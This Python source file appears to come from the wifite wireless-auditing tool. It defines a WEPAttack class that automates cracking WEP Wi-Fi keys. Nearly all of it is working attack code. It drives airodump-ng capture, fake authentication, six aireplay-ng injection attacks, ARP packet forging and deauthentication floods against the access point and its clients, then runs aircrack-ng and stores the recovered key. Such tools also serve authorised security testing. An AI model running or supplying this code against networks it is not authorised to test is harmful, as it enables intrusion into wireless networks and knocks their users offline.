from wifite.attack import Attack


class WEPAttack(Attack):
    def __init__(self, iface, target, clients, config):
        self.iface = iface
        self.target = target
        self.clients = clients
        self.RUN_CONFIG = config

    def run(self):
        """
            Abstract method for dispatching the WEP crack
        """
        self.attack_wep()

    def end(self):
        """
            Abstract method for ending the WEP attack
        """
        pass

    def attack_wep(self):
        """
        Attacks WEP-encrypted network.
        Returns True if key was successfully found, False otherwise.
        """
        if self.RUN_CONFIG.WEP_TIMEOUT <= 0: self.RUN_CONFIG.WEP_TIMEOUT = -1

        total_attacks = 6 # 4 + (2 if len(clients) > 0 else 0)
        if not self.RUN_CONFIG.WEP_ARP_REPLAY: total_attacks -= 1
        if not self.RUN_CONFIG.WEP_CHOPCHOP:   total_attacks -= 1
        if not self.RUN_CONFIG.WEP_FRAGMENT:   total_attacks -= 1
        if not self.RUN_CONFIG.WEP_CAFFELATTE: total_attacks -= 1
        if not self.RUN_CONFIG.WEP_P0841:      total_attacks -= 1
        if not self.RUN_CONFIG.WEP_HIRTE:      total_attacks -= 1

        if total_attacks <= 0:
            print R+' [!]'+O+' unable to initiate WEP attacks: no attacks are selected!'
            return False
        remaining_attacks = total_attacks

        print ' %s preparing attack "%s" (%s)' % \
               (GR+sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT)+W, G+self.target.ssid+W, G+self.target.bssid+W)

        remove_airodump_files(self.RUN_CONFIG.temp + 'wep')
        remove_file(self.RUN_CONFIG.temp + 'wepkey.txt')

        # Start airodump process to capture packets
        cmd_airodump = ['airodump-ng',
           '-w', self.RUN_CONFIG.temp + 'wep',      # Output file name (wep-01.cap, wep-01.csv)
           '-c', self.target.channel,    # Wireless channel
           '--bssid', self.target.bssid,
           self.iface]
        proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)
        proc_aireplay = None
        proc_aircrack = None

        successful       = False # Flag for when attack is successful
        started_cracking = False # Flag for when we have started aircrack-ng
        client_mac       = ''    # The client mac we will send packets to/from

        total_ivs = 0
        ivs = 0
        last_ivs = 0
        for attack_num in xrange(0, 6):

            # Skip disabled attacks
            if   attack_num == 0 and not self.RUN_CONFIG.WEP_ARP_REPLAY: continue
            elif attack_num == 1 and not self.RUN_CONFIG.WEP_CHOPCHOP:   continue
            elif attack_num == 2 and not self.RUN_CONFIG.WEP_FRAGMENT:   continue
            elif attack_num == 3 and not self.RUN_CONFIG.WEP_CAFFELATTE: continue
            elif attack_num == 4 and not self.RUN_CONFIG.WEP_P0841:      continue
            elif attack_num == 5 and not self.RUN_CONFIG.WEP_HIRTE:      continue

            remaining_attacks -= 1

            try:

                if self.wep_fake_auth(self.iface, self.target, sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT)):
                    # Successful fake auth
                    client_mac = self.RUN_CONFIG.THIS_MAC
                elif not self.RUN_CONFIG.WEP_IGNORE_FAKEAUTH:
                    send_interrupt(proc_aireplay)
                    send_interrupt(proc_airodump)
                    print R+' [!]'+O+' unable to fake-authenticate with target'
                    print R+' [!]'+O+' to skip this speed bump, select "ignore-fake-auth" at command-line'
                    return False

                remove_file(self.RUN_CONFIG.temp + 'arp.cap')
                # Generate the aireplay-ng arguments based on attack_num and other params
                cmd = self.get_aireplay_command(self.iface, attack_num, self.target, self.clients, client_mac)
                if cmd == '': continue
                if proc_aireplay != None:
                    send_interrupt(proc_aireplay)
                proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)

                print '\r %s attacking "%s" via' % (GR+sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT)+W, G+self.target.ssid+W),
                if attack_num == 0:   print G+'arp-replay',
                elif attack_num == 1: print G+'chop-chop',
                elif attack_num == 2: print G+'fragmentation',
                elif attack_num == 3: print G+'caffe-latte',
                elif attack_num == 4: print G+'p0841',
                elif attack_num == 5: print G+'hirte',
                print 'attack'+W

                print ' %s captured %s%d%s ivs @ %s iv/sec' % (GR+sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT)+W, G, total_ivs, W, G+'0'+W),
                stdout.flush()

                time.sleep(1)
                if attack_num == 1:
                    # Send a deauth packet to broadcast and all clients *just because!*
                    self.wep_send_deauths(self.iface, self.target, self.clients)
                last_deauth = time.time()

                replaying = False
                time_started = time.time()
                while time.time() - time_started < self.RUN_CONFIG.WEP_TIMEOUT:
                    # time.sleep(5)
                    for time_count in xrange(0, 6):
                        if self.RUN_CONFIG.WEP_TIMEOUT == -1:
                            current_hms = "[endless]"
                        else:
                            current_hms = sec_to_hms(self.RUN_CONFIG.WEP_TIMEOUT - (time.time() - time_started))
                        print "\r %s\r" % (GR+current_hms+W),
                        stdout.flush()
                        time.sleep(1)

                    # Calculates total seconds remaining

                    # Check number of IVs captured
                    csv = self.RUN_CONFIG.RUN_ENGINE.parse_csv(self.RUN_CONFIG.temp + 'wep-01.csv')[0]
                    if len(csv) > 0:
                        ivs = int(csv[0].data)
                        print "\r                                                   ",
                        print "\r %s captured %s%d%s ivs @ %s%d%s iv/sec" % \
                                  (GR+current_hms+W, G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),

                        if ivs - last_ivs == 0 and time.time() - last_deauth > 30:
                            print "\r %s deauthing to generate packets..." % (GR+current_hms+W),
                            self.wep_send_deauths(self.iface, self.target, self.clients)
                            print "done\r",
                            last_deauth = time.time()

                        last_ivs = ivs
                        stdout.flush()
                        if total_ivs + ivs >= self.RUN_CONFIG.WEP_CRACK_AT_IVS and not started_cracking:
                            # Start cracking
                            cmd = ['aircrack-ng',
                                   '-a', '1',
                                   '-l', self.RUN_CONFIG.temp + 'wepkey.txt']
                                   #temp + 'wep-01.cap']
                            # Append all .cap files in temp directory (in case we are resuming)
                            for f in os.listdir(self.RUN_CONFIG.temp):
                                if f.startswith('wep-') and f.endswith('.cap'):
                                    cmd.append(self.RUN_CONFIG.temp + f)

                            print "\r %s started %s (%sover %d ivs%s)" % (GR+current_hms+W, G+'cracking'+W, G, self.RUN_CONFIG.WEP_CRACK_AT_IVS, W)
                            proc_aircrack = Popen(cmd, stdout=DN, stderr=DN)
                            started_cracking = True

                    # Check if key has been cracked yet.
                    if os.path.exists(self.RUN_CONFIG.temp + 'wepkey.txt'):
                        # Cracked!
                        infile = open(self.RUN_CONFIG.temp + 'wepkey.txt', 'r')
                        key = infile.read().replace('\n', '')
                        infile.close()
                        print '\n\n %s %s %s (%s)! key: "%s"' % (current_hms, G+'cracked', self.target.ssid+W, G+self.target.bssid+W, C+key+W)
                        self.RUN_CONFIG.WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (self.target.ssid, self.target.bssid, key))
                        self.RUN_CONFIG.WEP_FINDINGS.append('')

                        t = Target(self.target.bssid, 0, 0, 0, 'WEP', self.target.ssid)
                        t.key = key
                        self.RUN_CONFIG.save_cracked(t)

                        # Kill processes
                        send_interrupt(proc_airodump)
                        send_interrupt(proc_aireplay)
                        try: os.kill(proc_aireplay, SIGTERM)
                        except: pass
                        send_interrupt(proc_aircrack)
                        # Remove files generated by airodump/aireplay/packetforce
                        time.sleep(0.5)
                        remove_airodump_files(self.RUN_CONFIG.temp + 'wep')
                        remove_file(self.RUN_CONFIG.temp + 'wepkey.txt')
                        return True

                    # Check if aireplay is still executing
                    if proc_aireplay.poll() == None:
                        if replaying: print ', '+G+'replaying         \r'+W,
                        elif attack_num == 1 or attack_num == 2: print ', waiting for packet    \r',
                        stdout.flush()
                        continue

                    # At this point, aireplay has stopped
                    if attack_num != 1 and attack_num != 2:
                        print '\r %s attack failed: %saireplay-ng exited unexpectedly%s' % (R+current_hms, O, W)
                        break # Break out of attack's While loop

                    # Check for a .XOR file (we expect one when doing chopchop/fragmentation
                    xor_file = ''
                    for filename in sorted(os.listdir(self.RUN_CONFIG.temp)):
                        if filename.lower().endswith('.xor'): xor_file = self.RUN_CONFIG.temp + filename
                    if xor_file == '':
                        print '\r %s attack failed: %sunable to generate keystream        %s' % (R+current_hms, O, W)
                        break

                    remove_file(self.RUN_CONFIG.temp + 'arp.cap')
                    cmd = ['packetforge-ng',
                             '-0',
                             '-a', self.target.bssid,
                             '-h', client_mac,
                             '-k', '192.168.1.2',
                             '-l', '192.168.1.100',
                             '-y', xor_file,
                             '-w', self.RUN_CONFIG.temp + 'arp.cap',
                             self.iface]
                    proc_pforge = Popen(cmd, stdout=PIPE, stderr=DN)
                    proc_pforge.wait()
                    forged_packet = proc_pforge.communicate()[0]
                    remove_file(xor_file)
                    if forged_packet == None: result = ''
                    forged_packet = forged_packet.strip()
                    if not forged_packet.find('Wrote packet'):
                        print "\r %s attack failed: unable to forget ARP packet               %s" % (R+current_hms+O, W)
                        break

                    # We were able to forge a packet, so let's replay it via aireplay-ng
                    cmd = ['aireplay-ng',
                           '--ignore-negative-one',
                           '--arpreplay',
                           '-b', self.target.bssid,
                           '-r', self.RUN_CONFIG.temp + 'arp.cap', # Used the forged ARP packet
                           '-F', # Select the first packet
                           self.iface]
                    proc_aireplay = Popen(cmd, stdout=DN, stderr=DN)

                    print '\r %s forged %s! %s...         ' % (GR+current_hms+W, G+'arp packet'+W, G+'replaying'+W)
                    replaying = True

                # After the attacks, if we are already cracking, wait for the key to be found!
                while started_cracking: # ivs > WEP_CRACK_AT_IVS:
                    time.sleep(5)
                    # Check number of IVs captured
                    csv = self.RUN_CONFIG.RUN_ENGINE.parse_csv(self.RUN_CONFIG.temp + 'wep-01.csv')[0]
                    if len(csv) > 0:
                        ivs = int(csv[0].data)
                        print GR+" [endless]"+W+" captured %s%d%s ivs, iv/sec: %s%d%s  \r" % \
                                                 (G, total_ivs + ivs, W, G, (ivs - last_ivs) / 5, W),
                        last_ivs = ivs
                        stdout.flush()

                    # Check if key has been cracked yet.
                    if os.path.exists(self.RUN_CONFIG.temp + 'wepkey.txt'):
                        # Cracked!
                        infile = open(self.RUN_CONFIG.temp + 'wepkey.txt', 'r')
                        key = infile.read().replace('\n', '')
                        infile.close()
                        print GR+'\n\n [endless] %s %s (%s)! key: "%s"' % (G+'cracked', self.target.ssid+W, G+self.target.bssid+W, C+key+W)
                        self.RUN_CONFIG.WEP_FINDINGS.append('cracked %s (%s), key: "%s"' % (self.target.ssid, self.target.bssid, key))
                        self.RUN_CONFIG.WEP_FINDINGS.append('')

                        t = Target(self.target.bssid, 0, 0, 0, 'WEP', self.target.ssid)
                        t.key = key
                        self.RUN_CONFIG.save_cracked(t)

                        # Kill processes
                        send_interrupt(proc_airodump)
                        send_interrupt(proc_aireplay)
                        send_interrupt(proc_aircrack)
                        # Remove files generated by airodump/aireplay/packetforce
                        remove_airodump_files(self.RUN_CONFIG.temp + 'wep')
                        remove_file(self.RUN_CONFIG.temp + 'wepkey.txt')
                        return True

            # Keyboard interrupt during attack
            except KeyboardInterrupt:
                print R+'\n (^C)'+O+' WEP attack interrupted\n'+W

                send_interrupt(proc_airodump)
                if proc_aireplay != None:
                    send_interrupt(proc_aireplay)
                if proc_aircrack != None:
                    send_interrupt(proc_aircrack)

                options = []
                selections = []
                if remaining_attacks > 0:
                    options.append('%scontinue%s attacking this target (%d remaining WEP attack%s)' % \
                                            (G, W, (remaining_attacks), 's' if remaining_attacks != 1 else ''))
                    selections.append(G+'c'+W)

                if self.RUN_CONFIG.TARGETS_REMAINING > 0:
                    options.append('%sskip%s     this target, move onto next target (%d remaining target%s)' % \
                                        (O, W, self.RUN_CONFIG.TARGETS_REMAINING, 's' if self.RUN_CONFIG.TARGETS_REMAINING != 1 else ''))
                    selections.append(O+'s'+W)

                options.append('%sexit%s     the program completely' % (R, W))
                selections.append(R+'e'+W)

                if len(options) > 1:
                    # Ask user what they want to do, Store answer in "response"
                    print GR+' [+]'+W+' what do you want to do?'
                    response = ''
                    while response != 'c' and response != 's' and response != 'e':
                        for option in options:
                            print '     %s' % option
                        response = raw_input(GR+' [+]'+W+' please make a selection (%s): ' % (', '.join(selections))).lower()[0]
                else:
                    response = 'e'

                if response == 'e' or response == 's':
                    # Exit or skip target (either way, stop this attack)
                    if self.RUN_CONFIG.WEP_SAVE:
                        # Save packets
                        save_as = re.sub(r'[^a-zA-Z0-9]', '', self.target.ssid) + '_' + self.target.bssid.replace(':', '-') + '.cap'+W
                        try:            rename(self.RUN_CONFIG.temp + 'wep-01.cap', save_as)
                        except OSError: print R+' [!]'+O+' unable to save capture file!'+W
                        else:           print GR+' [+]'+W+' packet capture '+G+'saved'+W+' to '+G+save_as+W

                    # Remove files generated by airodump/aireplay/packetforce
                    for filename in os.listdir('.'):
                        if filename.startswith('replay_arp-') and filename.endswith('.cap'):
                            remove_file(filename)
                    remove_airodump_files(self.RUN_CONFIG.temp + 'wep')
                    remove_file(self.RUN_CONFIG.temp + 'wepkey.txt')
                    print ''
                    if response == 'e':
                        self.RUN_CONFIG.exit_gracefully(0)
                    return

                elif response == 'c':
                    # Continue attacks
                    # Need to backup temp/wep-01.cap and remove airodump files
                    i= 2
                    while os.path.exists(self.RUN_CONFIG.temp + 'wep-' + str(i) + '.cap'):
                        i += 1
                    copy(self.RUN_CONFIG.temp + "wep-01.cap", self.RUN_CONFIG.temp + 'wep-' + str(i) + '.cap')
                    remove_airodump_files(self.RUN_CONFIG.temp + 'wep')

                    # Need to restart airodump-ng, as it's been interrupted/killed
                    proc_airodump = Popen(cmd_airodump, stdout=DN, stderr=DN)

                    # Say we haven't started cracking yet, so we re-start if needed.
                    started_cracking = False

                    # Reset IVs counters for proper behavior
                    total_ivs += ivs
                    ivs = 0
                    last_ivs = 0

                    # Also need to remember to crack "temp/*.cap" instead of just wep-01.cap
                    pass


        if successful:
            print GR+'\n [0:00:00]'+W+' attack complete: '+G+'success!'+W
        else:
            print GR+'\n [0:00:00]'+W+' attack complete: '+R+'failure'+W

        send_interrupt(proc_airodump)
        if proc_aireplay != None:
            send_interrupt(proc_aireplay)

        # Remove files generated by airodump/aireplay/packetforce
        for filename in os.listdir('.'):
            if filename.startswith('replay_arp-') and filename.endswith('.cap'):
                remove_file(filename)
        remove_airodump_files(self.RUN_CONFIG.temp + 'wep')
        remove_file(self.RUN_CONFIG.temp + 'wepkey.txt')

    def wep_fake_auth(self, iface, target, time_to_display):
        """
            Attempt to (falsely) authenticate with a WEP access point.
            Gives 3 seconds to make each 5 authentication attempts.
            Returns True if authentication was successful, False otherwise.
        """
        max_wait = 3 # Time, in seconds, to allow each fake authentication
        max_attempts = 5 # Number of attempts to make

        for fa_index in xrange(1, max_attempts + 1):
            print '\r                                                            ',
            print '\r %s attempting %sfake authentication%s (%d/%d)... ' % \
                   (GR+time_to_display+W, G, W, fa_index, max_attempts),
            stdout.flush()

            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '-1', '0', # Fake auth, no delay
                   '-a', target.bssid,
                   '-T', '1'] # Make 1 attempt
            if target.ssid != '':
                cmd.append('-e')
                cmd.append(target.ssid)
            cmd.append(iface)

            proc_fakeauth = Popen(cmd, stdout=PIPE, stderr=DN)
            started = time.time()
            while proc_fakeauth.poll() == None and time.time() - started <= max_wait: pass
            if time.time() - started > max_wait:
                send_interrupt(proc_fakeauth)
                print R+'failed'+W,
                stdout.flush()
                time.sleep(0.5)
                continue

            result = proc_fakeauth.communicate()[0].lower()
            if result.find('switching to shared key') != -1 or \
                 result.find('rejects open system'): pass
            if result.find('association successful') != -1:
                print G+'success!'+W
                return True

            print R+'failed'+W,
            stdout.flush()
            time.sleep(0.5)
            continue
        print ''
        return False

    def get_aireplay_command(self, iface, attack_num, target, clients, client_mac):
        """
            Returns aireplay-ng command line arguments based on parameters.
        """
        cmd = ''
        if attack_num == 0:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--arpreplay',
                   '-b', target.bssid,
                   '-x', str(self.RUN_CONFIG.WEP_PPS)] # Packets per second
            if client_mac != '':
                cmd.append('-h')
                cmd.append(client_mac)
            elif len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 1:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--chopchop',
                   '-b', target.bssid,
                   '-x', str(self.RUN_CONFIG.WEP_PPS), # Packets per second
                   '-m', '60', # Minimum packet length (bytes)
                   '-n', '82', # Maxmimum packet length
                   '-F'] # Automatically choose the first packet
            if client_mac != '':
                cmd.append('-h')
                cmd.append(client_mac)
            elif len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 2:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--fragment',
                   '-b', target.bssid,
                   '-x', str(self.RUN_CONFIG.WEP_PPS), # Packets per second
                   '-m', '100', # Minimum packet length (bytes)
                   '-F'] # Automatically choose the first packet
            if client_mac != '':
                cmd.append('-h')
                cmd.append(client_mac)
            elif len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 3:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--caffe-latte',
                   '-b', target.bssid]
            if len(clients) > 0:
                cmd.append('-h')
                cmd.append(clients[0].bssid)
            cmd.append(iface)

        elif attack_num == 4:
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--interactive',
                   '-b', target.bssid,
                   '-c', 'ff:ff:ff:ff:ff:ff',
                   '-t', '1', # Only select packets with ToDS bit set
                   '-x', str(self.RUN_CONFIG.WEP_PPS), # Packets per second
                   '-F',      # Automatically choose the first packet
                   '-p', '0841']
            cmd.append(iface)

        elif attack_num == 5:
            if len(clients) == 0:
                print R+' [0:00:00] unable to carry out hirte attack: '+O+'no clients'
                return ''
            cmd = ['aireplay-ng',
                   '--ignore-negative-one',
                   '--cfrag',
                   '-h', clients[0].bssid,
                   iface]

        return cmd

    def wep_send_deauths(self, iface, target, clients):
        """
            Sends deauth packets to broadcast and every client.
        """
        # Send deauth to broadcast
        cmd = ['aireplay-ng',
               '--ignore-negative-one',
               '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),
               '-a', target.bssid,
               iface]
        call(cmd, stdout=DN, stderr=DN)
        # Send deauth to every client
        for client in clients:
            cmd = ['aireplay-ng',
                     '--ignore-negative-one',
                     '--deauth', str(self.RUN_CONFIG.WPA_DEAUTH_COUNT),
                     '-a', target.bssid,
                     '-h', client.bssid,
                     iface]
            call(cmd, stdout=DN, stderr=DN)